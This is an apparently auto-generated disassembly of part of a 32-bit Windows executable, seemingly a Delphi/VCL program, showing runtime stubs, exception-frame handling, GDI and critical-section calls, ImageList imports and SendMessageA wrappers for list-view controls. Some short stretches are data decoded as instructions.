retn
sub_425540
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_425578
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4256c4
retn
sub_42578d
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4257a4
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_425890
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4258b0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4258d0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4258f0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
pop ebx
retn
sub_425908
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
pop ebx
retn
sub_42592c
mov eax [ rw-data ]
call sub_425908
retn
sub_425982
jmp sub_403a2c
sub_425989
pop ecx
pop ebp
retn
sub_425a28
jmp sub_403a2c
sub_425a2f
pop ebx
mov esp ebp
pop ebp
retn
sub_425b01
jmp sub_403a2c
sub_425b92
jmp sub_403a2c
sub_425b99
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bc4
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_425cab
jmp sub_403a2c
sub_425e58
jmp sub_403a2c
sub_425e5f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_426071
jmp sub_403a2c
sub_426078
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_426112
jmp sub_403a2c
sub_4262ee
jmp sub_403a2c
sub_4263a8
jmp sub_403a2c
sub_4263af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263cf
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4263c8
jmp sub_403a2c
sub_4263cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42655d
jmp sub_403a2c
sub_426728
jmp sub_403a2c
sub_42672f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426752
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_40270c
retn
sub_42674b
jmp sub_403a2c
sub_426752
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426772
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
sub_42676b
jmp sub_403a2c
sub_426772
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4268c4
push 0x0
call sub_426860
retn
sub_426969
jmp sub_403a2c
sub_426970
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42697c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_4268cc
pop ebx
pop ebp
retn 0x4
sub_426990
retn
sub_426994
test eax eax
jne r-xdata
retn
call sub_426990
sub_426b67
jmp sub_403a2c
sub_426b8e
jmp sub_403a2c
sub_426b95
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426bd4
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426da1
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_426daa
jmp sub_403a2c
j_sub_426da1
jmp sub_426da1
sub_426db1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_426dc7
jmp sub_403a2c
sub_426dd8
xor eax eax
retn
sub_426ddc
mov al [ eax + 0x21 ]
retn
sub_426e28
jmp sub_403a2c
sub_426e2f
pop esi
pop ecx
pop ebp
retn
sub_426e5c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426eb3
jmp sub_403a2c
sub_426eba
pop esi
pop ecx
pop ebp
retn
sub_426ec0
retn
sub_426ec4
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426ed4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426ff2
jmp sub_403a2c
sub_42701a
jmp sub_403a2c
sub_427021
mov esp ebp
pop ebp
retn
sub_427098
jmp sub_403a2c
sub_4271a0
jmp sub_403a2c
sub_42728b
jmp sub_403a2c
sub_427298
inc [ eax + 0x4 ]
retn
sub_427413
jmp sub_403a2c
sub_4277c4
jmp sub_403a2c
sub_427a0e
jmp sub_403a2c
sub_427a38
jmp sub_403a2c
sub_427a3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a61
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_427a5a
jmp sub_403a2c
sub_427a6b
jmp sub_403778
sub_427aba
jmp sub_403a2c
sub_427ce7
jmp sub_403a2c
sub_427d2f
jmp sub_403a2c
sub_427e9c
jmp sub_403a2c
sub_427f63
jmp sub_403778
sub_427fb8
mov [ eax + 0x31 ] 0x0
call sub_426bd4
retn
sub_428209
jmp sub_403a2c
sub_428274
jmp sub_403a2c
sub_42827b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4282ec
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_4283a0
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_4283b0
push ebx
mov ebx eax
mov eax ebx
call sub_428648
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_4283c4
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4283e0
push ebx
mov ebx eax
mov eax ebx
call sub_4286a8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_42843c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42854b
jmp sub_403a2c
sub_428612
jmp sub_403778
sub_42888f
jmp sub_403778
sub_4288ef
jmp sub_403a2c
sub_4288f6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_428cd7
jmp sub_403a2c
sub_428d03
jmp sub_403a2c
sub_428d6a
jmp sub_403778
sub_428d9b
jmp sub_403a2c
sub_428e20
jmp sub_403778
sub_428e25
mov eax [ ebp - 0x38 ]
call sub_4032b0
call sub_403a8c
call sub_403ae0
sub_428e37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e54
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
sub_428e4d
jmp sub_403a2c
sub_428fa3
jmp sub_403778
sub_42926f
jmp sub_403778
sub_429300
mov cl 0x1
call sub_429308
retn
sub_4295bd
add [ eax ] al
add [ ebx ] dh
leave
call sub_429308
retn
sub_429642
jmp sub_403778
sub_429647
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a8c
call sub_403ae0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429698
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4297d1
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429800
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_429814
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42992d
jmp sub_403778
sub_4299e2
jmp sub_403778
sub_429a4c
jmp sub_403778
sub_429a80
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_429a0c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429a98
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4258f0
retn
mov [ eax + 0x30 ] edx
retn
sub_429ab0
retn
sub_429ab4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4258f0
retn
mov [ eax + 0x2c ] edx
retn
sub_429af4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4258f0
pop ebp
retn 0x4
sub_429b08
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4258f0
pop ebp
retn 0x4
sub_429cc8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_429cd4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_429d81
jmp sub_403a2c
sub_429d88
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429e73
jmp sub_403778
sub_429edf
jmp sub_403a2c
sub_42a00d
jmp sub_403a2c
sub_42a014
pop ebp
retn
sub_42a114
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42a149
jmp sub_403a2c
sub_42a150
pop ebp
retn
sub_42a154
sub [ rw-data ] 0x1
retn
sub_42a39c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4189b0
retn
sub_42a3d0
mov eax [ eax + 0x4 ]
call sub_418854
retn
sub_42a401
jmp sub_403a2c
sub_42a408
pop ebp
retn
sub_42a40c
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_13(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_13(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ __import_lookup_table_13(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_13(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_13(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_42a4f4
shl eax 0x8
retn
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_13(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_13(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_SetIconSize) ]
sub_42a59c
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_42a5ac
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1001
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a5e0
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_42a5f0
shl eax 0xc
retn
sub_42a5f4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a60c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a624
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a63c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1008
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a654
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageA
pop ebx
retn
sub_42a68c
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_42a6d8
push edx
push 0x0
push 0x1012
push eax
call SendMessageA
retn
sub_42a704
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1016
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a71c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageA
pop ebx
retn
sub_42a74c
push ecx
push edx
push 0x101b
push eax
call SendMessageA
retn
sub_42a75c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a774
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a7cc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1024
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a7e4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1026
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a7fc
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageA
retn
sub_42a80c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a874
push ecx
push edx
push 0x102c
push eax
call SendMessageA
retn
sub_42a900
push 0x0
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42a910
push ecx
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42a93c
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageA
retn
sub_42a94c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1036
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a9b8
push edx
push 0x0
push 0x1047
push eax
call SendMessageA
retn
sub_42a9c8
push 0x0
push 0x0
push 0x1048
push eax
call SendMessageA
retn
sub_42a9d8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a9f0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42aa08
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_42aa18
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_42aa7c
push 0x0
push 0x0
push 0x1008
push eax
call SendMessageA
retn
sub_42aab1
jmp sub_403a2c
sub_42aab8
pop ebp
retn
sub_42aabc
sub [ rw-data ] 0x1
retn
sub_42ab83
jmp sub_403a2c
sub_42ab8a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b1a0
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42abac
mov [ rw-data ] sub_42acc4
mov [ rw-data ] sub_42ac34
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42aec8
mov [ rw-data ] sub_42af9c
mov [ rw-data ] sub_42b070
retn
sub_42b231
jmp sub_403a2c
sub_42b238
pop ebp
retn
sub_42b23c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b1a0
sub_42b271
jmp sub_403a2c
sub_42b278
pop ebp
retn
sub_42b27c
sub [ rw-data ] 0x1
retn
sub_42b50b
add eax 0xffffffd4
jmp sub_42c038
sub_42b513
add eax 0xffffffd4
jmp sub_42c094
sub_42b525
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a18
sub_42b52f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a2c
sub_42b6be
jmp sub_403a2c
sub_42b6c5
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b8d5
jmp sub_403a2c
sub_42b8dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ba91
jmp sub_403a2c
sub_42baf6
jmp sub_403a2c
sub_42bafd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bbe9
jmp sub_403a2c
sub_42bbf0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42be00
lea eax [ ebp - 0x30 ]
call sub_4040ac
lea eax [ ebp - 0x20 ]
call sub_4040ac
retn
sub_42be11
jmp sub_403a2c
j_sub_42be00
jmp sub_42be00
sub_42be18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bf13
jmp sub_403a2c
sub_42bf1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c017
jmp sub_403a2c
sub_42c01e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c087
jmp sub_403a2c
sub_42c08e
pop ebx
pop ecx
pop ebp
retn
sub_42c129
jmp sub_403a2c
sub_42c130
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42c13c
mov eax [ eax + 0x20 ]
retn
sub_42c26b
jmp sub_403a2c
sub_42c272
pop ebp
retn
sub_42c274
sub [ rw-data ] 0x1
retn
sub_42c2a1
jmp sub_403a2c
sub_42c2a8
pop ebp
retn
sub_42c2ac
sub [ rw-data ] 0x1
retn
sub_42c2e5
jmp sub_403a2c
sub_42c2ec
pop ebp
retn
sub_42c2f0
sub [ rw-data ] 0x1
retn
sub_42c5fd
jmp sub_403a2c
sub_42c604
pop ebp
retn
sub_42c608
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c354
sub_42c6e8
retn
sub_42c75c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42c768
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42c774
mov edx [ eax ]
call [ edx ]
retn
sub_42c77c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42c7a9
jmp sub_403a2c
sub_42c7b0
pop ebp
retn
sub_42c7b4
sub [ rw-data ] 0x1
retn
sub_42c973
jmp sub_403a2c
sub_42c97a
pop ebp
retn
sub_42cd2f
jmp sub_403a2c
sub_42cd36
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42d150
jmp sub_403a2c
sub_42d157
pop ebp
retn
sub_42d15c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c6ec
mov [ rw-data ] eax
sub_42d19d
jmp sub_403a2c
sub_42d1a4
pop ebp
retn
sub_42d1a8
sub [ rw-data ] 0x1
retn
sub_42d1d5
jmp sub_403a2c
sub_42d1dc
pop ebp
retn
sub_42d1e0
sub [ rw-data ] 0x1
retn
sub_42d20d
jmp sub_403a2c
sub_42d214
pop ebp
retn
sub_42d218
sub [ rw-data ] 0x1
retn
sub_42d245
jmp sub_403a2c
sub_42d24c
pop ebp
retn
sub_42d250
sub [ rw-data ] 0x1
retn
sub_42d27d
jmp sub_403a2c
sub_42d284
pop ebp
retn
sub_42d288
sub [ rw-data ] 0x1
retn
sub_42d2b5
jmp sub_403a2c
sub_42d2bc
pop ebp
retn
sub_42d2c0
sub [ rw-data ] 0x1
retn
sub_42d321
jmp sub_403a2c
sub_42d328
pop ebp
retn
sub_42d32c
sub [ rw-data ] 0x1
retn
sub_42d359
jmp sub_403a2c
sub_42d360
pop ebp
retn
sub_42d364
sub [ rw-data ] 0x1
retn
sub_42d391
jmp sub_403a2c
sub_42d398
pop ebp
retn
sub_42d39c
sub [ rw-data ] 0x1
retn
sub_42d616
jmp sub_403778
sub_42d61b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d638
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d640
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4034ac
pop esi
retn
sub_42d658
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4034ac
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42d670
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42d719
jmp sub_403a2c
sub_42d747
jmp sub_403a2c
sub_42d74e
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d758
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42d76c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42d9ca
jmp sub_403a2c
sub_42d9d1
pop ebp
retn
sub_42e3be
jmp sub_403778
sub_42e477
jmp sub_403a2c
sub_42e47e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e484
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42e3f8
sub_42e494
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42e3f8
sub_42e4a4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42e3f8
pop ebp
retn 0x8
sub_42e4bc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42e759
jmp sub_403778
sub_42e8cc
retn
sub_42ea59
jmp sub_403a2c
sub_42eadc
push ebx
mov ebx eax
mov eax ebx
call sub_451928
mov eax ebx
call sub_42e8d0
pop ebx
retn
sub_42eaf0
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_452048
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42ec18
pop ebx
retn
sub_42ec08
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42ece1
jmp sub_403a2c
sub_42ece8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ed30
push ebx
mov ebx eax
mov eax ebx
call sub_4555b0
mov eax ebx
call sub_42e8d0
pop ebx
retn
sub_42ed44
push ebx
mov ebx eax
mov eax ebx
call sub_445458
mov eax ebx
call sub_42e8d0
pop ebx
retn
sub_42ed58
mov al 0x1
retn
sub_42ed5c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42f094
jmp sub_403a2c
sub_42f09b
pop ebp
retn
sub_42f0a0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403db0
mov eax [ r-xdata ]
call sub_417fe4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
sub_42f13d
jmp sub_403a2c
sub_42f144
pop ebp
retn
sub_42f148
sub [ rw-data ] 0x1
retn
sub_42f181
jmp sub_403a2c
sub_42f188
pop ebp
retn
sub_42f18c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42f208
retn
sub_42f209
jmp sub_403a2c
j_sub_42f208
jmp sub_42f208
sub_42f210
pop ebp
retn
sub_42f214
sub [ rw-data ] 0x1
retn
sub_42f21c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4032b0
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42f242
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] al
dec eax
add [ edi + edx * 8 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x48
sub_42f2e0
jmp sub_403a2c
sub_42f2e7
pop ebp
retn
sub_42f2ec
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dfc
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402cc4
sub_42f339
jmp sub_403a2c
sub_42f340
pop ebp
retn
sub_42f344
sub [ rw-data ] 0x1
retn
sub_42f3a0
jmp sub_403a2c
sub_42f3a7
pop ebp
retn
sub_42f3ac
sub [ rw-data ] 0x1
retn
sub_42f408
jmp sub_403a2c
sub_42f40f
pop ebp
retn
sub_42f414
sub [ rw-data ] 0x1
retn
sub_42f475
jmp sub_403a2c
sub_42f47c
pop ebp
retn
sub_42f480
sub [ rw-data ] 0x1
retn
sub_42f4cc
jmp sub_403a2c
sub_42f4d3
pop ebp
retn
sub_42f4d8
sub [ rw-data ] 0x1
retn
sub_42fb35
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
int3
sub_43026f
jmp sub_403a2c
sub_43027c
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4302f4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404100
mov eax ebx
call sub_43027c
pop esi
pop ebx
retn
sub_430310
mov [ eax + 0x14 ] edx
call sub_43027c
retn
sub_43031c
mov [ eax + 0x18 ] edx
call sub_43027c
retn
sub_430354
push ebx
mov ebx eax
mov eax ebx
call sub_419580
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_4304d4
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_430328
call sub_430364
sub_4304ec
mov edx sub_430328
call sub_430364
retn
sub_4306b1
jmp sub_403a2c
sub_4306ec
push ebx
mov ebx ecx
mov eax ebx
call sub_4040ac
pop ebx
retn
sub_4306f8
mov al 0x1
retn
sub_4307fd
jmp sub_403a2c
sub_4308f8
retn
sub_430a1b
jmp sub_403a2c
sub_430a22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430d6c
mov eax [ eax + 0xd0 ]
call sub_419720
retn
sub_430ddc
mov eax [ r-xdata ]
retn
sub_430e08
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_430e3c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_430f2c
retn
sub_431073
jmp sub_403a2c
sub_43107a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431084
retn
sub_4310a7
jmp sub_403a2c
sub_4310ae
pop ebp
retn 0x4
sub_431111
jmp sub_403a2c
sub_431118
pop ebp
retn
sub_43111c
sub [ rw-data ] 0x1
retn
sub_432983
add [ eax + eax ] ch
add [ eax ] al
int3
sub_433ae2
inc ebx
add [ eax - 0x35 ] bh
inc ebx
add [ eax - 0x31 ] dh
inc ebx
add al dh

sub_433d42
inc ebx
add [ eax - 0x35 ] bh
inc ebx
add [ eax - 0x31 ] dh
inc ebx
add al dh

sub_436154
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c32c
mov [ rw-data ] eax
sub_4362a8
